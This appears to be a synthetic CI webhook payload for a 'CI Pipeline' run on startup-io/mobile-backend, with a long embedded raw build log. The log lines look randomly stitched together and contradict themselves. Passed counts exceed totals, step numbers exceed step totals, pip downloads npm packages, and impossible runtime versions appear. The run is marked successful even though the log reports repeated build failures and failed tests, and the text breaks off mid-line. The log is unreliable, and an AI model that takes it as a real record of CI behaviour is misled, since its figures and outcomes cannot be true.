{
  "action": "completed",
  "workflow_run": {
    "id": 706,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-226",
    "head_sha": "3d653e39a05dcd1f402eeace5656f3b76887b5d0",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-25T12:47:23.786952Z",
    "updated_at": "2025-11-25T12:51:43.478601Z"
  },
  "repository": {
    "full_name": "startup-io/mobile-backend",
    "name": "mobile-backend"
  },
  "sender": {
    "login": "diana"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: checkout ===\nBundling runtime.js\nArtifact uploaded: dist.zip (62MB)\nRan 118 tests in 4s\nCache saved successfully\nImage pulled successfully\nOptimizing 12 modules...\n[12:47:23] DEBUG: Memory usage: 1625MB\nArtifact uploaded: build.tar.gz (31MB)\nCache hit for key-8455\nPlatform: darwin-arm64\nBuilding Docker image...\n[12:47:23] WARN: Deprecated API usage\nCompiling src/index.js...\nTest Suites: 43 passed, 33 total\n[12:47:23] INFO: Connecting to database\n\u2713 All checks passed\nMinifying vendor.js\nInstalling eslint@1.11.10\nWaiting...\n\u2713 Task completed in 899ms\n[12:47:23] DEBUG: Connection pool: 11 active\n[12:47:23] ERROR: Connection failed\nnpm notice: created a lockfile\nPOST /upload - 201 (484ms)\nEnvironment: staging\n\u2713 Task completed in 4671ms\nSuccess!\nProcessing...\n\u2713 lint completed\n\u2713 lint completed\nStep 4/15: Building\nWaiting...\nCompiling utils/service.java...\nGET /api - 201 (45ms)\nCreating production build...\nArtifact uploaded: build.tar.gz (12MB)\nUsing Node.js 18.1.10\n\u2713 All checks passed\nCache hit for key-1891\nLoading...\nPulling image: node:3.11\nCache invalidated: build\nStep 11/19: Installing dependencies\nSnapshots: 39 passed, 4 total\nSuccess!\nBuilding Docker image...\nDone.\npip: Downloading react-4.4.tar.gz\nnpm install: resolved 261 packages\nProcessing...\npip: Downloading prettier-1.16.tar.gz\nStep 1/19: Running migrations\nStep 15/16: Building\nOK\npip: Collecting eslint\nGET /health - 200 (26ms)\nCompleted.\n[12:47:23] DEBUG: Query executed in 98ms\n[12:47:23] WARN: Deprecated API usage\n[12:47:23] ERROR: Connection failed\nnpm install: added 50 packages\nSnapshots: 27 passed, 34 total\nUploading artifact 'dist' (43 files)\nDone.\npip: Installing build dependencies...\nCache hit for key-1217\nWARNING: express has known vulnerabilities\nSuccess!\npip: Collecting webpack\nTest Suites: 22 passed, 29 total\n[12:47:23] WARN: Deprecated API usage\nnpm install: added 328 packages\nCreating production build...\nArtifact uploaded: dist.zip (54MB)\n\u2713 All checks passed\nyarn add: Done in 23.53s\nPOST /data - 201 (433ms)\nTLS handshake completed\nCompleted.\nAlready up to date.\nInstalling axios@5.16.3\nnpm install: added 374 packages\nException: NullPointerException\nyarn add: Done in 5.57s\n[12:47:23] DEBUG: Query executed in 67ms\n[12:47:23] INFO: Connecting to database\nCoverage: 84% statements, 63% branches\n[12:47:23] INFO: Processing request\nCompiling lib/utils.go...\npip: Collecting axios\nReady.\nCache miss for key-1266\nCache miss for key-4321\nInstalling react@2.8.3\n[12:47:23] INFO: Connecting to database\nCompiling src/handler.rs...\nUsing Node.js 18.9.7\n[12:47:23] DEBUG: Connection pool: 19 active\nHEAD is now at 64f142f\nCache hit for key-9795\nCache invalidated: build\nUploading artifact 'build' (3 files)\nGenerating source maps...\n\u2713 Task completed in 696ms\nFinished.\nTransforming 739 files...\nHEAD is now at caabb42\n[12:47:23] DEBUG: Query executed in 80ms\n\u2713 Step 'build' succeeded\nTransforming 359 files...\nWARNING: express has known vulnerabilities\nCompiling src/main.py...\nCompiling src/index.js...\nUploading artifact 'build' (17 files)\nInstalling webpack@4.16.2\nInstalling react@3.17.7\nUsing Python 3.11\nOptimizing 42 modules...\nArtifact downloaded: 14MB\n[12:47:23] DEBUG: Memory usage: 272MB\nMinifying vendor.js\n[12:47:23] INFO: Request completed\nMinifying vendor.js\nCache restored successfully (430MB)\nTest Suites: 44 passed, 19 total\n[12:47:23] DEBUG: Loading configuration\n\u2717 build failed with exit code 40\nRan 116 tests in 24s\nInstalling axios@2.18.7\nCreating production build...\n[12:47:23] DEBUG: Loading configuration\nCompiling lib/main.py...\nCompiling components/handler.rs...\nEnvironment: production\nAlready up to date.\nReady.\nPlatform: win32-x64\nWARNING: prettier has known vulnerabilities\n\u2717 build failed with exit code 25\nMinifying vendor.js\nDone.\nOK\nStep 16/17: Building\nCompiling components/main.py...\nArtifact uploaded: dist.zip (63MB)\nyarn add: Done in 18.94s\n[12:47:23] DEBUG: Query executed in 73ms\nPulling image: python:18\nTransforming 358 files...\nStep 16/25: Linting\n[12:47:23] INFO: Request completed\nyarn add: Done in 8.72s\nGenerating source maps...\nCache hit for key-7735\nCompleted.\nOK\nSnapshots: 36 passed, 11 total\n[12:47:23] INFO: Processing request\nCompiling utils/utils.go...\n\u2713 validate completed\nGenerating source maps...\n[12:47:23] ERROR: Connection failed\nReady.\nWaiting...\nStep 14/24: Running migrations\nCache restored successfully (453MB)\nStep 5/21: Linting\nnpm install: added 200 packages\n[12:47:23] DEBUG: Loading configuration\nNODE_ENV=development\nProcessing...\nArtifact downloaded: 22MB\nStep 7/18: Installing dependencies\nUsing Node.js 14.16.5\nStep 7/24: Installing dependencies\nCoverage: 89% statements, 66% branches\n[12:47:23] INFO: Connecting to database\nProcessing...\nStep 7/17: Linting\nnpm install: resolved 548 packages\nMinifying main.js\nTest Suites: 7 passed, 15 total\n[12:47:23] DEBUG: Initializing service\n=== Step checkout completed ===\n=== Step: upload_artifacts ===\npip: Installing build dependencies...\nGenerating source maps...\nCompiling src/app.ts...\nArtifact uploaded: dist.zip (72MB)\nMinifying main.js\nFetching from https://pypi.org/package.json\nGenerating source maps...\nWARNING: axios has known vulnerabilities\nArtifact uploaded: dist.zip (69MB)\nStep 17/22: Linting\nTest Suites: 34 passed, 22 total\n  PASS: unit/test_api_health.spec.js\nNODE_ENV=test\n[12:47:23] DEBUG: Loading configuration\nVerifying...\nWARNING: express has known vulnerabilities\nSwitched to branch 'hotfix/task-500'\n\u2713 lint completed\n\u2713 test completed\nReady.\nRan 117 tests in 50s\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling eslint@4.9.7\nStep 5/21: Building\n[12:47:23] WARN: Deprecated API usage\nChecking out master branch\nCache miss for key-9778\nCache saved successfully\nStep 13/20: Deploying\nTLS handshake completed\n\u2713 Task completed in 1124ms\nTime: 19.830s\n[12:47:23] WARN: Deprecated API usage\nStep 10/18: Testing\npip: Installing build dependencies...\n[12:47:23] INFO: Starting build process\n\u2713 lint completed\nnpm install: added 270 packages\nHEAD is now at 3050a4d\npip: Installing build dependencies...\nCache hit for key-1475\nInstalling react@2.14.0\nFinished.\nnpm notice: created a lockfile\nStep 19/25: Testing\nTests: 136 passed, 323 total\nUsing Node.js 17.19.9\nCompiling utils/main.py...\nFinished.\nArtifact downloaded: 8MB\nUsing Node.js 20.19.1\nHEAD is now at 6a914e7\nRan 61 tests in 50s\nDone.\nGenerating source maps...\n[12:47:23] WARN: Deprecated API usage\nnpm install: resolved 1159 packages\nCache restored successfully (13MB)\nHEAD is now at e2b0b35\nDone.\nFAILED: test_user_create\nFinished.\nnpm notice: package.json updated\nTime: 13.473s\nStep 19/25: Linting\nStep 13/24: Running migrations\nUsing Python 3.12\nBundling main.css\n[12:47:23] DEBUG: Connection pool: 6 active\nBuilding Docker image...\nWARNING: prettier has known vulnerabilities\nPlatform: win32-x64\n[12:47:23] INFO: Processing request\nGET /api - 201 (31ms)\nUploading artifact 'build' (22 files)\nArtifact uploaded: dist.zip (36MB)\n[12:47:23] DEBUG: Memory usage: 1312MB\n[12:47:23] DEBUG: Memory usage: 911MB\nDone.\nAlready up to date.\nPOST /api - 201 (323ms)\n[12:47:23] INFO: Connecting to database\n[12:47:23] DEBUG: Memory usage: 845MB\nCompleted.\nStep 7/21: Deploying\nSwitched to branch 'hotfix/task-204'\nStep 14/22: Deploying\nUsing Node.js 15.11.4\nRan 120 tests in 1s\n[12:47:23] WARN: Deprecated API usage\nPOST /upload - 201 (491ms)\n\u2713 package completed\n\u2713 All checks passed\n  PASS: test_db_connect (432ms)\nBuilding Docker image...\n[12:47:23] DEBUG: Initializing service\nAlready up to date.\nCache hit for key-1449\nUsing Python 3.9\n\u2713 package completed\nHEAD is now at 74592e2\n[12:47:23] WARN: Deprecated API usage\nCache hit for key-7119\nArtifact downloaded: 36MB\nCompiling utils/main.py...\nTime: 70.545s\n\u2717 build failed with exit code 27\nBuilding Docker image...\nCache miss for key-3386\nChecking out develop branch\n\u2713 All checks passed\nSnapshots: 7 passed, 5 total\nFetching from https://githubusercontent.com/package.json\n[12:47:23] INFO: Starting build process\nProcessing...\nTest Suites: 40 passed, 40 total\nStep 20/20: Linting\nStep 2/25: Installing dependencies\nUsing Node.js 15.3.1\nCoverage: 77% statements, 76% branches\n\u2713 Step 'checkout' succeeded\nPOST /api - 201 (134ms)\n[12:47:23] INFO: Connecting to database\nWARNING: react has known vulnerabilities\n  PASS: test_db_connect (326ms)\n[12:47:23] WARN: Deprecated API usage\nWARNING: jest has known vulnerabilities\nTLS handshake completed\nEnvironment: staging\nUploading artifact 'build' (7 files)\nFinished.\nException: NullPointerException\nRan 29 tests in 30s\nProcessing...\nPOST /data - 201 (130ms)\nStep 16/22: Deploying\nnpm notice: package.json updated\nTLS handshake completed\nPushing to registry...\nSnapshots: 6 passed, 17 total\nSwitched to branch 'bugfix/task-635'\npip: Installing build dependencies...\nnpm install: resolved 1233 packages\nOptimizing 59 modules...\nPlatform: win32-x64\nCreating production build...\n\u2713 All checks passed\nCache invalidated: build\n[12:47:23] WARN: Deprecated API usage\n[12:47:23] INFO: Processing request\nGET /health - 204 (72ms)\nUsing Python 3.9\nFinished.\nException: TypeError\nException: TypeError\nTests: 475 passed, 349 total\n  PASS: test_auth_login (232ms)\n[12:47:23] INFO: Processing request\nBuilding Docker image...\nPlatform: win32-x64\nPushing to registry...\nMinifying vendor.js\nSnapshots: 38 passed, 13 total\nStep 3/21: Deploying\nStep 9/16: Deploying\nCache saved successfully\nGenerating source maps...\nnpm notice: created a lockfile\nPOST /api - 200 (392ms)\n[12:47:23] INFO: Processing request\nPulling image: alpine:3.11\nWaiting...\npip: Downloading express-4.4.tar.gz\nReady.\nArtifact uploaded: dist.zip (43MB)\n[12:47:23] DEBUG: Initializing service\n  PASS: test_api_health (167ms)\nStep 5/22: Installing dependencies\nCache invalidated: node_modules\nCache miss for key-3397\nOK\nSnapshots: 7 passed, 35 total\nWARNING: prettier has known vulnerabilities\n=== Step upload_artifacts completed ===\n=== Step: lint ===\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache restored successfully (264MB)\nStep 16/24: Testing\nStep 19/17: Deploying\npip: Downloading eslint-1.9.tar.gz\n\u2713 validate completed\n[12:47:23] INFO: Processing request\nCompleted.\nTLS handshake completed\nTransforming 624 files...\nFetching from https://docker.io/package.json\npip install: Successfully installed lodash-4.0\nCache invalidated: node_modules\n  PASS: test_db_connect (13ms)\nWARNING: axios has known vulnerabilities\nCompiling components/index.js...\n\u2713 All checks passed\n[12:47:23] DEBUG: Connection pool: 4 active\n[12:47:23] ERROR: Connection failed\n  PASS: e2e/test_auth_login.spec.js\nRan 115 tests in 41s\n[12:47:23] INFO: Connecting to database\npip install: Successfully installed react-2.9\nProcessing...\n[12:47:23] INFO: Starting build process\nGET /health - 204 (52ms)\n  PASS: test_cache_hit (435ms)\nnpm notice: package.json updated\nTests: 213 passed, 226 total\n\u2713 test completed\n[12:47:23] INFO: Processing request\n[12:47:23] WARN: Deprecated API usage\n[12:47:23] DEBUG: Memory usage: 1046MB\nStep 20/20: Installing dependencies\npip: Installing build dependencies...\npip: Installing build dependencies...\n[12:47:23] ERROR: Connection failed\nPOST /data - 201 (82ms)\nArtifact uploaded: dist.zip (34MB)\n\u2713 Step 'test' succeeded\nyarn add: Done in 16.44s\n[12:47:23] DEBUG: Loading configuration\nEnvironment: test\nMinifying app.js\npip: Installing build dependencies...\n[12:47:23] DEBUG: Query executed in 95ms\n\u2713 Task completed in 227ms\n[12:47:23] DEBUG: Connection pool: 10 active\nMinifying app.js\nFinished.\nnpm install: resolved 1381 packages\n[12:47:23] ERROR: Connection failed\nnpm notice: package.json updated\n[12:47:23] DEBUG: Initializing service\nCache saved successfully\nReady.\nFetching from https://amazonaws.com/package.json\nCompiling utils/index.js...\n[12:47:23] ERROR: Connection failed\npip install: Successfully installed eslint-5.11\n  PASS: e2e/test_db_connect.spec.js\nCache hit for key-9950\nnpm notice: created a lockfile\nCache restored successfully (326MB)\nSuccess!\n[12:47:23] WARN: Deprecated API usage\nSnapshots: 12 passed, 7 total\nDone.\nCache hit for key-1587\nCache saved successfully\nArtifact downloaded: 46MB\n[12:47:23] INFO: Starting build process\n[12:47:23] DEBUG: Query executed in 22ms\nStep 13/25: Linting\nCreating production build...\nTransforming 244 files...\nCompiling components/utils.go...\nPushing to registry...\nTLS handshake completed\nnpm notice: package.json updated\nTests: 470 passed, 66 total\nTransforming 756 files...\nAlready up to date.\n[12:47:23] WARN: Deprecated API usage\nyarn add: Done in 11.61s\nArtifact uploaded: build.tar.gz (17MB)\nCache saved successfully\n[12:47:23] DEBUG: Initializing service\nWARNING: eslint has known vulnerabilities\nTests: 349 passed, 459 total\n\u2713 Step 'setup' succeeded\n\u2713 All checks passed\nUsing Python 3.12\nFAILED: test_api_health\n[12:47:23] INFO: Processing request\nPushing to registry...\nStep 18/17: Installing dependencies\nTime: 106.319s\nArtifact uploaded: build.tar.gz (10MB)\npip: Downloading prettier-3.1.tar.gz\nOptimizing 83 modules...\nPulling image: python:3.11\nCache hit for key-9752\nWARNING: express has known vulnerabilities\nException: RuntimeError\nPushing to registry...\nPushing to registry...\npip: Collecting react\n\u2713 All checks passed\nArtifact uploaded: build.tar.gz (47MB)\nReady.\n\u2717 build failed with exit code 35\n[12:47:23] INFO: Starting build process\nConnection established\n[12:47:23] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: integration/test_auth_login.spec.js\nLoading...\nnpm notice: package.json updated\nLoading...\nProcessing...\n[12:47:23] WARN: Deprecated API usage\nTLS handshake completed\nStep 4/19: Running migrations\nTests: 262 passed, 118 total\n[12:47:23] INFO: Cache refreshed\nWARNING: axios has known vulnerabilities\nCache saved successfully\nSnapshots: 24 passed, 23 total\nProcessing...\nCache miss for key-6813\n[12:47:23] DEBUG: Memory usage: 106MB\nStep 19/25: Linting\nCompiling src/main.py...\nCache invalidated: build\nGET /health - 200 (74ms)\nWARNING: express has known vulnerabilities\n  PASS: test_cache_hit (289ms)\nImage pulled successfully\nCache miss for key-2463\nOK\nSuccess!\n  PASS: test_api_health (288ms)\nArtifact downloaded: 18MB\nPlatform: linux-x64\nProcessing...\nPlatform: win32-x64\nUploading artifact 'coverage' (28 files)\nVerifying...\npip: Downloading prettier-4.10.tar.gz\nConnection established\nyarn add: Done in 21.50s\n[12:47:23] DEBUG: Loading configuration\nWaiting...\nTime: 109.183s\n  PASS: test_cache_hit (67ms)\nOptimizing 32 modules...\n\u2717 build failed with exit code 105\nImage pulled successfully\n[12:47:23] INFO: Connecting to database\nCoverage: 100% statements, 74% branches\nPushing to registry...\n\u2713 Task completed in 4290ms\nWARNING: express has known vulnerabilities\nReady.\nnpm install: resolved 666 packages\nCompleted.\nConnection established\nnpm install: added 227 packages\nCache restored successfully (366MB)\nBundling main.css\nBuilding Docker image...\nSwitched to branch 'bugfix/task-138'\nCache miss for key-6021\n[12:47:23] DEBUG: Connection pool: 12 active\nVerifying...\nCache miss for key-5427\nImage pulled successfully\nPulling image: python:3.11\nEnvironment: production\n[12:47:23] DEBUG: Query executed in 15ms\n[12:47:23] INFO: Cache refreshed\nBundling runtime.js\n=== Step lint completed ===\n=== Step: build ===\nChecking out master branch\n[12:47:23] DEBUG: Memory usage: 1747MB\n\u2713 All checks passed\n\u2713 All checks passed\npip: Installing build dependencies...\nCache invalidated: dependencies\nUsing Python 3.11\npip: Collecting react\nPOST /data - 201 (298ms)\n[12:47:23] INFO: Starting build process\nCompiling components/handler.rs...\nStep 7/25: Deploying\n  PASS: test_api_health (61ms)\nnpm notice: package.json updated\nGET /api - 204 (74ms)\nCache invalidated: dependencies\nProcessing...\nPlatform: linux-x64\nCompiling lib/app.ts...\nPulling image: alpine:3.11\n[12:47:23] DEBUG: Loading configuration\nStep 12/25: Running migrations\n[12:47:23] WARN: Deprecated API usage\n[12:47:23] DEBUG: Query executed in 99ms\n[12:47:23] ERROR: Connection failed\nStep 9/18: Running migrations\n\u2713 Step 'checkout' succeeded\nCompiling utils/utils.go...\n[12:47:23] INFO: Processing request\nEnvironment: test\n[12:47:23] ERROR: Connection failed\nGenerating source maps...\n[12:47:23] DEBUG: Initializing service\nPOST /data - 200 (369ms)\nCompiling lib/service.java...\nPushing to registry...\nUploading artifact 'coverage' (17 files)\nWARNING: prettier has known vulnerabilities\nChecking out master branch\n[12:47:23] DEBUG: Initializing service\n[12:47:23] ERROR: Connection failed\nCompiling utils/handler.rs...\nnpm install: added 303 packages\nChecking out main branch\nyarn add: Done in 18.57s\nFetching submodules...\nCompiling lib/main.py...\nCreating production build...\nAlready up to date.\npip: Installing build dependencies...\n[12:47:23] DEBUG: Loading configuration\n[12:47:23] DEBUG: Query executed in 41ms\nCompiling components/index.js...\nReady.\nMinifying app.js\nCache hit for key-3608\nyarn add: Done in 5.78s\npip: Installing build dependencies...\nException: TypeError\n\u2713 All checks passed\nWaiting...\nnpm notice: package.json updated\nOptimizing 95 modules...\nGET /status - 200 (7ms)\nMinifying main.js\nWARNING: prettier has known vulnerabilities\nFAILED: test_auth_login\npip: Downloading axios-3.3.tar.gz\n[12:47:23] WARN: Deprecated API usage\nChecking out main branch\nFetching from https://pypi.org/package.json\nSuccess!\nCoverage: 100% statements, 95% branches\nStep 1/24: Deploying\nEnvironment: staging\n[12:47:23] INFO: Cache refreshed\nCoverage: 83% statements, 78% branches\nException: ValueError\n[12:47:23] WARN: Deprecated API usage\nWARNING: express has known vulnerabilities\nCompiling utils/main.py...\nUploading artifact 'dist' (37 files)\nPushing to registry...\nCompiling components/service.java...\nArtifact uploaded: dist.zip (30MB)\nLoading...\nnpm install: resolved 1705 packages\nTime: 79.255s\nImage pulled successfully\n[12:47:23] DEBUG: Loading configuration\nnpm notice: package.json updated\n[12:47:23] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 17/20: Linting\n  PASS: integration/test_user_create.spec.js\nnpm install: resolved 963 packages\nSuccess!\nOptimizing 29 modules...\n[12:47:23] INFO: Starting build process\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCoverage: 94% statements, 65% branches\nCache miss for key-6671\nUsing Node.js 20.2.0\nUsing Node.js 20.14.10\n  PASS: unit/test_api_health.spec.js\npip: Collecting axios\nCache invalidated: dependencies\nHEAD is now at 792536a\nyarn add: Done in 22.89s\nWARNING: express has known vulnerabilities\nSuccess!\nStep 20/16: Deploying\nWARNING: eslint has known vulnerabilities\n[12:47:23] INFO: Starting build process\nStep 15/25: Testing\nSuccess!\n\u2713 package completed\npip: Downloading prettier-3.20.tar.gz\n  PASS: e2e/test_auth_login.spec.js\nSuccess!\n[12:47:23] DEBUG: Query executed in 85ms\nStep 5/25: Testing\n[12:47:23] INFO: Cache refreshed\nInstalling prettier@3.8.10\n\u2713 All checks passed\nSuccess!\nGenerating source maps...\nUsing Python 3.12\n[12:47:23] INFO: Connecting to database\nGenerating source maps...\nLayer 4/11: RUN command\nyarn add: Done in 23.57s\nCache miss for key-9527\n[12:47:23] INFO: Connecting to database\nDone.\n\u2713 All checks passed\nnpm notice: package.json updated\nCompleted.\nUsing Node.js 20.15.7\nTests: 410 passed, 351 total\nWARNING: axios has known vulnerabilities\nCreating production build...\nCache saved successfully\nConnection established\npip install: Successfully installed jest-4.7\nStep 3/24: Testing\nException: NullPointerException\nProcessing...\nnpm notice: created a lockfile\nLoading...\n\u2713 Task completed in 4899ms\nUsing Node.js 17.17.4\n\u2713 package completed\nGET /health - 200 (87ms)\nStep 2/24: Testing\n[12:47:23] DEBUG: Query executed in 21ms\n  PASS: test_user_create (285ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:47:23] WARN: Deprecated API usage\nStep 8/23: Linting\nAlready up to date.\nOK\nHEAD is now at 2a53840\n[12:47:23] DEBUG: Loading configuration\n[12:47:23] WARN: Deprecated API usage\nPushing to registry...\nConnection established\nUsing Python 3.12\nCache restored successfully (51MB)\nWARNING: prettier has known vulnerabilities\nnpm notice: package.json updated\nArtifact uploaded: dist.zip (83MB)\nConnection established\nUsing Python 3.9\n[12:47:23] DEBUG: Query executed in 7ms\nPOST /data - 202 (177ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:47:23] INFO: Cache refreshed\nTests: 459 passed, 61 total\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCreating production build...\nImage pulled successfully\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n=== Step build completed ===\n=== Step: deploy_production ===\nHEAD is now at 14cc1c0\nStep 13/25: Linting\n[12:47:23] DEBUG: Memory usage: 1149MB\nDone.\nOK\n[12:47:23] DEBUG: Loading configuration\n  PASS: integration/test_db_connect.spec.js\nLoading...\nCreating production build...\n[12:47:23] ERROR: Connection failed\n[12:47:23] INFO: Starting build process\nDone.\n[12:47:23] WARN: Deprecated API usage\nException: NullPointerException\nCache miss for key-9957\n[12:47:23] WARN: Deprecated API usage\nnpm install: resolved 1736 packages\nCache invalidated: node_modules\nCache miss for key-1571\npip: Downloading lodash-4.1.tar.gz\nBuilding Docker image...\nCache hit for key-2334\nFetching from https://github.com/package.json\n[12:47:23] INFO: Starting build process\nRan 139 tests in 31s\nnpm notice: created a lockfile\n[12:47:23] WARN: Deprecated API usage\n[12:47:23] DEBUG: Initializing service\nTransforming 870 files...\n[12:47:23] DEBUG: Initializing service\n[12:47:23] INFO: Starting build process\nWaiting...\nChecking out main branch\nStep 16/17: Deploying\n[12:47:23] WARN: Deprecated API usage\nStep 8/15: Testing\n\u2713 deploy completed\nAlready up to date.\nWARNING: webpack has known vulnerabilities\nVerifying...\nyarn add: Done in 5.56s\nTests: 181 passed, 455 total\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nHEAD is now at a363e1a\n[12:47:23] INFO: Cache refreshed\n[12:47:23] INFO: Request completed\nEnvironment: test\nCache saved successfully\nBuilding Docker image...\n  PASS: test_cache_hit (214ms)\n\u2713 Task completed in 4610ms\nCompiling lib/service.java...\nLayer 5/8: COPY command\n[12:47:23] DEBUG: Initializing service\nCache hit for key-9308\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nGenerating source maps...\n[12:47:23] INFO: Request completed\nnpm install: added 334 packages\nUsing Node.js 15.14.2\n[12:47:23] DEBUG: Memory usage: 980MB\n[12:47:23] DEBUG: Initializing service\nStep 3/18: Running migrations\nDone.\n[12:47:23] DEBUG: Query executed in 87ms\nCache hit for key-9357\nImage pulled successfully\nCompiling utils/app.ts...\nFAILED: test_auth_login\nnpm notice: package.json updated\n[12:47:23] DEBUG: Connection pool: 10 active\nReady.\nCache hit for key-3684\nCreating production build...\nCache miss for key-4596\nUploading artifact 'coverage' (1 files)\nFetching submodules...\nTest Suites: 46 passed, 31 total\nPushing to registry...\nException: NullPointerException\nCache miss for key-5118\nCompiling components/handler.rs...\nCompiling lib/utils.go...\n[12:47:23] INFO: Connecting to database\n\u2713 All checks passed\n[12:47:23] INFO: Processing request\n\u2713 test completed\nCompiling components/main.py...\nStep 15/23: Linting\n\u2713 Task completed in 1702ms\nChecking out master branch\nTest Suites: 46 passed, 36 total\n[12:47:23] INFO: Processing request\n[12:47:23] WARN: Deprecated API usage\nnpm install: added 405 packages\nProcessing...\nTest Suites: 22 passed, 13 total\nGET /status - 204 (35ms)\nTransforming 868 files...\n[12:47:23] INFO: Cache refreshed\nCreating production build...\nnpm install: resolved 336 packages\nFetching submodules...\nRan 62 tests in 48s\nNODE_ENV=test\nStep 2/17: Running migrations\nNODE_ENV=test\nTransforming 176 files...\nCoverage: 83% statements, 62% branches\nPulling image: python:3.11\nCache restored successfully (53MB)\nLoading...\nWaiting...\nArtifact downloaded: 16MB\npip install: Successfully installed axios-1.17\nPlatform: win32-x64\nSwitched to branch 'feature/task-105'\nFetching from https://googleapis.com/package.json\n[12:47:23] INFO: Connecting to database\nMinifying app.js\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nImage pulled successfully\nTLS handshake completed\nProcessing...\nStep 2/17: Building\nStep 20/22: Running migrations\nTest Suites: 19 passed, 42 total\nCompiling components/handler.rs...\n[12:47:23] WARN: Deprecated API usage\nWARNING: express has known vulnerabilities\nnpm notice: package.json updated\nStep 17/25: Linting\n  PASS: integration/test_user_create.spec.js\nBuilding Docker image...\nWaiting...\nGenerating source maps...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTransforming 489 files...\nBuilding Docker image...\nFetching submodules...\nDone.\nyarn add: Done in 29.32s\nImage pulled successfully\n  PASS: integration/test_api_health.spec.js\n[12:47:23] INFO: Connecting to database\nnpm install: resolved 1397 packages\nCompiling utils/utils.go...\nCache hit for key-4862\nChecking out main branch\n  PASS: test_db_connect (22ms)\n[12:47:23] DEBUG: Query executed in 70ms\nGET /health - 201 (38ms)\nUploading artifact 'dist' (43 files)\nConnection established\nException: RuntimeError\n\u2717 build failed with exit code 70\nAlready up to date.\nPushing to registry...\nUploading artifact 'dist' (10 files)\nRan 87 tests in 19s\n[12:47:23] INFO: Request completed\nCoverage: 99% statements, 95% branches\nNODE_ENV=production\nFetching submodules...\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWARNING: react has known vulnerabilities\n[12:47:23] INFO: Connecting to database\nTime: 79.304s\nCache miss for key-5455\n[12:47:23] DEBUG: Initializing service\nCache saved successfully\nFAILED: test_db_connect\nBundling vendor.css\nProcessing...\n  PASS: test_user_create (215ms)\nCompiling lib/handler.rs...\nTLS handshake completed\nCache miss for key-9939\nnpm install: added 107 packages\nMinifying main.js\nLoading...\n=== Step deploy_production completed ===\n=== Step: restore_cache ===\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nFAILED: test_api_health\nCoverage: 81% statements, 97% branches\nCache miss for key-7242\nSwitched to branch 'hotfix/task-919'\n[12:47:23] WARN: Deprecated API usage\nTime: 80.648s\n[12:47:23] WARN: Deprecated API usage\nUsing Python 3.10\n  PASS: e2e/test_db_connect.spec.js\nCompleted.\n  PASS: test_user_create (384ms)\npip: Installing build dependencies...\n[12:47:23] DEBUG: Loading configuration\nWARNING: lodash has known vulnerabilities\nCache saved successfully\nFetching from https://githubusercontent.com/package.json\nnpm install: added 235 packages\nMinifying vendor.js\nTest Suites: 29 passed, 28 total\n[12:47:23] INFO: Connecting to database\nArtifact uploaded: dist.zip (90MB)\nCreating production build...\nFetching from https://googleapis.com/package.json\nCache hit for key-3644\nStep 5/16: Linting\nHEAD is now at 6951ca6\nFAILED: test_cache_hit\nFetching submodules...\nBundling main.js\nCompiling components/utils.go...\nStep 2/18: Building\nWaiting...\nMinifying main.js\nVerifying...\n\u2713 Step 'test' succeeded\n\u2713 Step 'build' succeeded\nGET /status - 201 (50ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\npip install: Successfully installed eslint-2.7\nBuilding Docker image...\nSnapshots: 10 passed, 37 total\nCompiling lib/handler.rs...\nTLS handshake completed\nVerifying...\nVerifying...\nnpm install: added 221 packages\n  PASS: e2e/test_cache_hit.spec.js\npip: Downloading webpack-1.16.tar.gz\nPushing to registry...\nVerifying...\n[12:47:23] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:47:23] INFO: Cache refreshed\nPulling image: python:3.11\nCache miss for key-5666\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling components/index.js...\nCompiling src/main.py...\nCoverage: 93% statements, 72% branches\nArtifact uploaded: build.tar.gz (14MB)\nGenerating source maps...\nnpm install: added 296 packages\nnpm notice: created a lockfile\n\u2713 validate completed\nCache hit for key-3622\nCache invalidated: dependencies\nCoverage: 83% statements, 80% branches\nMinifying vendor.js\npip: Downloading lodash-2.18.tar.gz\nHEAD is now at 58e92fa\nStep 6/19: Deploying\nStep 14/18: Deploying\nEnvironment: test\nCache hit for key-7653\nStep 4/16: Building\nPOST /upload - 201 (185ms)\nTime: 21.551s\n[12:47:23] INFO: Connecting to database\nArtifact uploaded: dist.zip (5MB)\n[12:47:23] DEBUG: Query executed in 69ms\nCreating production build...\nHEAD is now at 626de3c\nMinifying vendor.js\nFinished.\nStep 12/24: Deploying\nnpm install: resolved 1124 packages\n\u2713 All checks passed\nTransforming 257 files...\nException: ValueError\nyarn add: Done in 4.33s\nCache restored successfully (423MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:47:23] WARN: Deprecated API usage\nGenerating source maps...\npip: Installing build dependencies...\nPOST /data - 201 (452ms)\nException: ValueError\nSwitched to branch 'feature/task-942'\n  PASS: e2e/test_cache_hit.spec.js\nOK\npip install: Successfully installed react-5.0\nCompiling components/service.java...\n[12:47:23] DEBUG: Memory usage: 664MB\nMinifying main.js\n\u2713 Step 'install' succeeded\npip install: Successfully installed prettier-2.17\nVerifying...\nCompiling src/main.py...\nVerifying...\nPulling image: alpine:18\nReady.\nRan 150 tests in 33s\nImage pulled successfully\nSwitched to branch 'bugfix/task-243'\nCompleted.\n\u2713 All checks passed\nLoading...\nArtifact uploaded: build.tar.gz (22MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 Step 'install' succeeded\n[12:47:23] WARN: Deprecated API usage\nPOST 